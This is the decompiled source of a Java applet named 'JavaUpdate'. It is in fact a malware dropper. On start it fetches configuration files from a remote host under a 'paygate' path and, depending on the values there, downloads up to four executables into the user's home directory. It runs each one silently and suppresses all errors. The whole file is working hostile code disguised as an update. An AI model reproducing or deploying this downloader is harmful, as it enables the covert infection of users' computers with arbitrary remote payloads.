import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.security.AccessControlException;
import java.util.ArrayList;
import java.io.InputStreamReader;
import java.net.URL;
import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class JavaUpdate extends Applet
{
    public String getContents(final File file) {
        final StringBuilder sb = new StringBuilder();
        try {
            final BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
            try {
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    sb.append(line);
                    sb.append(System.getProperty("line.separator"));
                }
            }
            finally {
                bufferedReader.close();
            }
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
        return sb.toString();
    }
    
    public String getConfig(final String s) {
        try {
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(s).openConnection().getInputStream()));
            final String line = bufferedReader.readLine();
            if (bufferedReader != null) {
                bufferedReader.close();
            }
            return line;
        }
        catch (IOException ex) {
            return null;
        }
    }
    
    public ArrayList<String> getConfigArray(final String s) {
        final ArrayList<String> list = new ArrayList<String>();
        try {
            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(s).openConnection().getInputStream()));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                list.add(line);
            }
            if (bufferedReader != null) {
                bufferedReader.close();
            }
            return list;
        }
        catch (IOException ex) {
            return null;
        }
    }
    
    public ArrayList<String> loadFile(final String s) {
        if (s == null || s == "") {
            throw new IllegalArgumentException();
        }
        final ArrayList<String> list = new ArrayList<String>();
        try {
            final BufferedReader bufferedReader = new BufferedReader(new FileReader(s));
            if (!bufferedReader.ready()) {
                throw new IOException();
            }
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                list.add(line);
            }
            bufferedReader.close();
        }
        catch (IOException ex) {
            System.out.println(ex);
            return null;
        }
        return list;
    }
    
    @Override
    public void start() throws AccessControlException {
        final String property = System.getProperty("user.home");
        final String s = "config.ini";
        final String s2 = "urls.ini";
        final String s3 = "files.ini";
        final String s4 = "http://www.calcommerce.net/paygate/confirm20987/";
        if (this.getConfig(s4 + s).contains("1") || this.getConfig(s4 + s).contains("2") || this.getConfig(s4 + s).contains("3") || this.getConfig(s4 + s).contains("4")) {
            final String concat = property.concat("\\" + this.getConfigArray(s4 + s3).get(0));
            this.download(this.getConfigArray(s4 + s2).get(0), concat);
            final Runtime runtime = Runtime.getRuntime();
            try {
                runtime.exec(concat);
            }
            catch (IOException ex) {}
        }
        if (this.getConfig(s4 + s).contains("2") || this.getConfig(s4 + s).contains("3") || this.getConfig(s4 + s).contains("4")) {
            final String string = "\\" + this.getConfigArray(s4 + s3).get(1);
            final Runtime runtime2 = Runtime.getRuntime();
            final String concat2 = property.concat(string);
            this.download(this.getConfigArray(s4 + s2).get(1), concat2);
            try {
                runtime2.exec(concat2);
            }
            catch (IOException ex2) {}
        }
        if (this.getConfig(s4 + s).contains("3") || this.getConfig(s4 + s).contains("4")) {
            final String string2 = "\\" + this.getConfigArray(s4 + s3).get(2);
            final Runtime runtime3 = Runtime.getRuntime();
            final String concat3 = property.concat(string2);
            this.download(this.getConfigArray(s4 + s2).get(2), concat3);
            try {
                runtime3.exec(concat3);
            }
            catch (IOException ex3) {}
        }
        if (this.getConfig(s4 + s).contains("4")) {
            final String string3 = "\\" + this.getConfigArray(s4 + s3).get(3);
            final Runtime runtime4 = Runtime.getRuntime();
            final String concat4 = property.concat(string3);
            this.download(this.getConfigArray(s4 + s2).get(3), concat4);
            try {
                runtime4.exec(concat4);
            }
            catch (IOException ex4) {}
        }
    }
    
    public void download(final String s, final String s2) {
        OutputStream outputStream = null;
        InputStream inputStream = null;
        try {
            final URL url = new URL(s);
            outputStream = new BufferedOutputStream(new FileOutputStream(s2));
            inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array)) != -1) {
                outputStream.write(array, 0, read);
            }
        }
        catch (Exception ex) {}
        finally {
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (outputStream != null) {
                    outputStream.close();
                }
            }
            catch (IOException ex2) {}
        }
    }
    
    public void main(final String[] array) {
        this.start();
    }
    
    @Override
    public void stop() {
    }
}
